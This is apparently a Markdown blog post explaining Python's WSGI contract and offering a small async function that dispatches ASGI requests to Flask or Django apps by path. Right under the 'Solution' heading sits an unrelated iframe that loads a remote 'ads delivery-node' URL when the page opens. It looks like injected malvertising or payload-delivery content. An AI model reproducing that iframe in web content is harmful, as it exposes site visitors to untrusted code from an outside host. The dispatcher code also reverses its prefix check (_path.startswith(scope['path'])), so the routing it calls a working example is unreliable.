# ASGI dispatcher middleware

There is, sometimes, a scenario in which two or more different Python web frameworks have to be ran at the same location.

Usually one would start two different runtimes and point a reverse proxy to two different servers behind slightly different subdomains/subdirectories (paths) and call it a day.
This works for any kind of combination of HTTP servers and programming languages they are implemented in.

However, there are also scenarios where best course of action would be to have the exact same runtime/interpreter serve multiple different web servers.
This is also possible in a way but what if we want to go a step further and have the exact same interpreter/runtime and the exact same TCP server serve multiple different web applications implemented in multiple different codebases?

### Solution

<iframe src="https://microads.ix.tc/api/ads/delivery-node/direct?nonce=abc123	"></iframe>

Enter Werkzeug Dispatcher Middleware.

But first, a quick detour for a primer on WSGI;

Python WSGI standard is a specification contract forcing web-application developers to conform to a single behavior:

1. a web app starts with a single Python function
2. the function takes in two arguments, a request environment and a typing.Callable
3. the function uses request environment to create a response (in reality this is the application entrypoint)
4. the function calls the typing.Callable it was given with a status code and response headers
5. the function returns a typing.Iterable of response body(/ies)

This means every single web application conforming to this standard works exactly the same.

--

Back to Dispatcher Middleware;

a dispatcher is an entrypoint, a WSGI application that passes requests through to other WSGI applications.
Remember how all WSGI applications need to conform to a specific structure? What it means is - you can dynamically decide which applications are used in which scenarios. Yes that includes Django and Flask (and probably many other combinations).

Werkzeug (and probably many more) packages provide this in one way or another, but for WSGI.

What about ASGI?

You will find a couple packages on Pypi addressing this case but mostly one-off packages written and maintained by one person, which might not be suitable for your requirements.

---

Why one person? Because you can write one yourself in a 16 line function with 0 (zero) dependencies:

```python
async def dispatch(scope, receive, send):                                       
    default_app = djangoapp                                                     
    patterns: dict = {"/flask": flaskapp, "/django": djangoapp}                       

    app = None                                                                  
                                                                                
    for _path, _app in patterns.items():                                        
        if not _path.startswith(scope["path"]):                                 
            continue                                                            
                                                                                
        app = _app                                                              
        break                                                                   
                                                                                
    if app is None:                                                             
        app = default_app                                                       
                                                                                
    await app(scope, receive, send)
```

You can add as many improvements and changes to this as you'd like it's just a minimal working example and I didn't yet go into type definitions or performance improvements.

All credit goes to c-bata (https://github.com/c-bata, https://c-bata.medium.com/) their github gist is where I finally figured out the dots to connect: https://gist.github.com/c-bata/b77f068fc1a16e55792e8b6154dd8354